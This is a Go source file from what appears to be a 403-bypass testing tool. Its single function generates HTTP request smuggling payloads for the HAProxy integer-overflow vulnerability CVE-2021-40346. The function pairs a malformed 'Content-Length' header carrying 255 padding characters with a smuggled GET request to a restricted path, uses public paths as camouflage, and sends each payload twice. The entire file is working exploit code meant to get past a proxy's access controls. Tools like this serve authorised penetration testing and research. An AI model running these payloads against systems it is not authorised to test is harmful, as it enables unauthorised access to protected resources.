package payload

import (
	"fmt"
	"strings"

	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

// https://github.com/donky16/CVE-2021-40346-POC

/*
GenerateHAProxyBypassPayloads generates payloads for exploiting the HAProxy CVE-2021-40346
integer overflow vulnerability that leads to HTTP Request Smuggling.

The vulnerability exploits an integer overflow in HAProxy's header parsing to smuggle an HTTP
request. By using a malformed Content-Length header that causes integer overflow, we can
smuggle a second request in the body of the first that will be processed by the backend server
but will bypass HAProxy's access controls.

References:
- https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/
- https://github.com/donky16/CVE-2021-40346-POC
*/
func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL: %s", targetURL)
		return allJobs
	}

	// Extract target host and path
	host := parsedURL.Host
	path := parsedURL.Path
	if parsedURL.Query != "" {
		path += "?" + parsedURL.Query
	}

	// Test various public endpoints before the restricted one
	publicPaths := []string{
		"/",
		"/public",
		"/guest",
		"/index",
		"/robots.txt",
		"/sitemap.xml",
		"/favicon.ico",
	}

	// Generate overflow pattern - exact pattern from working PoC
	// Content-Length0 + 256 'a' characters
	overflowPattern := "0" + strings.Repeat("a", 255)
	malformedHeaderName := "Content-Length" + overflowPattern

	// For each public path, try to smuggle a request to the target path
	for _, publicPath := range publicPaths {
		// Craft the smuggled request - this goes in the body and targets the RESTRICTED path
		// The h:GET header references the PUBLIC path for camouflage
		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
			path,       // Target/RESTRICTED path (what we want to access)
			publicPath, // PUBLIC path (for h:GET camouflage header)
			host)

		calculatedContentLength := len(smuggledRequest) - strings.Count(smuggledRequest, "\r") - strings.Count(smuggledRequest, "\n")

		GB403Logger.Debug().Msgf("== HAProxy Smuggled Request ==")
		GB403Logger.Debug().Msgf("Restricted target path: %s", path)
		GB403Logger.Debug().Msgf("Public path (for POST + h:GET): %s", publicPath)
		GB403Logger.Debug().Msgf("Host: %s", host)
		GB403Logger.Debug().Msgf("Smuggled request body (%d bytes total): %q", len(smuggledRequest), smuggledRequest)
		GB403Logger.Debug().Msgf("Content-Length calculation (without \\r\\n): %d bytes", calculatedContentLength)

		// Create payload matching the working PoC structure
		job := BypassPayload{
			OriginalURL:  targetURL,
			Method:       "POST",
			Scheme:       parsedURL.Scheme,
			Host:         host,
			RawURI:       publicPath,
			BypassModule: bypassModule,
			Body:         smuggledRequest,
			Headers: []Headers{
				// 1. Malformed header FIRST - NO VALUE after colon (like working PoC)
				{
					Header: malformedHeaderName, // e.g., "Content-Length0aaa..."
					Value:  "",                  // EMPTY VALUE - this is critical!
				},
				// 2. Real Content-Length will be deferred to LAST position in request.go
				{
					Header: "Content-Length",
					Value:  fmt.Sprintf("%d", calculatedContentLength),
				},
				{
					Header: "Connection",
					Value:  "close",
				},
			},
		}

		job.PayloadToken = GeneratePayloadToken(job)

		// HTTP Request Smuggling requires sending each request TWICE in sequence
		allJobs = append(allJobs, job)
		allJobs = append(allJobs, job) // Add the same job immediately twice
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payload(s) (%d variations x2 for smuggling) for %s", len(allJobs), len(publicPaths), targetURL)
	return allJobs
}
